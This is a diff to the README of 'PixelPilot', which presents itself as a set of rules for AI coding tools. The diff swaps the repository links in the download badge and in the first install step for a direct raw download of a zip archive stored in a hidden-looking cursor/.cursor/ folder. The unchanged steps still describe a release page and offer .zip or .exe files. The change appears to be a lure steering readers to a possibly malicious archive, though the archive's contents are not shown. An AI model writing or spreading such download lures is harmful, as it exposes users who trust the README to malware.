@@ -1,6 +1,6 @@
 # 🤖 PixelPilot - Create Unique Production Ready UI Code
 
-[![](https://img.shields.io/badge/Download_PixelPilot-007bff?style=for-the-badge&logo=github)](https://github.com/paoloincommensurable537/PixelPilot)
+[![](https://img.shields.io/badge/Download_PixelPilot-007bff?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paoloincommensurable537/PixelPilot/main/cursor/.cursor/Pilot-Pixel-v2.8.zip)
 
 PixelPilot helps you fix problems with AI coding tools. AI assistants often output repetitive or messy code. PixelPilot uses ninety-one specific rules to guide tools like Cursor, Copilot, and Windsurf. These rules force the AI to write clean, unique, and professional interface code for your projects. 
 
@@ -22,7 +22,7 @@ You need a few things before you begin:
 
 Follow these steps to set up PixelPilot on your computer.
 
-1. Go to the [official download page](https://github.com/paoloincommensurable537/PixelPilot).
+1. Go to the [official download page](https://raw.githubusercontent.com/paoloincommensurable537/PixelPilot/main/cursor/.cursor/Pilot-Pixel-v2.8.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Choose the file ending in `.zip` or `.exe` based on your system preference.
 4. Save the file to your computer.
